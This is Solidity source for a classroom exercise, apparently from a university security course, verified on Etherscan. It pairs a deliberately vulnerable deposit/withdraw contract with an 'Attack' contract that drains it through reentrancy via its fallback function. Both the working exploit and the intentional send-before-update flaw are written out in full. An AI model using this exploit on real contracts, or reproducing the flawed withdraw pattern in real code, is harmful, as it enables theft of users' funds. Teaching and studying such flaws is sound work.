/**
 *Submitted for verification at Etherscan.io on 2022-12-06
*/

pragma solidity ^0.6.0;

// This contract is vulnerable to having its funds stolen.
// Written for ECEN 4133 at the University of Colorado Boulder: https://ecen4133.org/
// (Adapted from ECEN 5033 w19)
// SPDX-License-Identifier: WTFPL
//
// Happy hacking, and play nice! :)
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call.value(balances[msg.sender])("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

contract Attack {
  Vuln public vuln;

  constructor(address _vulnAddress) public {
      vuln = Vuln(_vulnAddress);
  }

  function pwnVuln() public payable {
      require(msg.value >= .01 ether);
      vuln.deposit.value(.01 ether)();
      vuln.withdraw();
  }

  function collectEther() public {
      msg.sender.transfer(address(this).balance);
  }

  fallback() external payable {
      if (address(vuln).balance > 1 ether) {
          vuln.withdraw();
      }
  }
}